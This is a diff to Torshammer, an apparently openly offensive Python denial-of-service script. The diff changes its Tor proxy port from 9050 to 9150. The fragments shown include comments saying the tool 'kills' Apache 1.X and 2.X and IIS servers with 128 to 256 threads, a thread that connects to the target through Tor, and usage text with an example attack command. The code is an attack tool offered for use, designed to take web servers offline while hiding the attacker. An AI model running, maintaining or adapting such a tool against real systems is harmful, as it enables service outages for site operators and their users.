@@ -3,7 +3,7 @@
 # this assumes you have the socks.py (http://phiral.net/socks.py) 
 # and terminal.py (http://phiral.net/terminal.py) in the
 # same directory and that you have tor running locally 
-# on port 9050. run with 128 to 256 threads to be effective.
+# on port 9150. run with 128 to 256 threads to be effective.
 # kills apache 1.X with ~128, apache 2.X / IIS with ~256
 # not effective on nginx
 
@@ -86,7 +86,7 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:     
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                     break
@@ -113,7 +113,7 @@ def usage():
     print " -t|--target <Hostname|IP>"
     print " -r|--threads <Number of threads> Defaults to 256"
     print " -p|--port <Web Server Port> Defaults to 80"
-    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
+    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150"
     print " -h|--help Shows this help\n" 
     print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
 
